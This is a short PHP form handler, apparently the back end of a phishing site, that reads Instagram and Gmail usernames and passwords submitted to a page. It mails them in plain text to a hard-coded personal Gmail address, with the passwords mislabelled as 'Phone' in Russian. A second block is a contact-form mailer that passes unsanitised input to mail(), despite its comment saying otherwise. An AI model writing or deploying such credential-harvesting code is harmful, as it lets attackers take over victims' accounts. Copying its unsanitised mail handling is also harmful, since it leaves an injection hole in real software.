<?php

$recepient = "innadanylevska@gmail.com";
$sitename = "idress4weather.github.io";

$instaName = trim($_POST["instaName"]);
$instaPassword = trim($_POST["instaPassword"]);
$gmailName = trim($_POST["gmailName"]);
$gmailPassword = trim($_POST["gmailPassword"]);
$message = "Имя: $instaName \nТелефон: $instaPassword \n$gmailName \nТелефон: $gmailPassword";

$pagetitle = "Новая заявка с сайта \"$sitename\"";
mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");

// Emails form data to you and the person submitting the form
// This version requires no database.
// Set your email below
$myemail = "innadanylevska@gmail.com"; // Replace with your email, please

// Receive and sanitize input
$name = $_POST['name'];
$email = $_POST['email'];
$phone = $_POST['phone'];
$message = $_POST['message'];

// set up email
$msg = "New contact form submission!\nName: " . $name . "\nEmail: " . $email . "\nPhone: " . $phone . "\nEmail: " . $email;
$msg = wordwrap($msg,70);
mail($myemail,"New Form Submission",$msg);
mail($email,"Thank you for your form submission",$msg);
echo 'Thank you for your submission.  Please <a href="index.html">Click here to return to our homepage.';

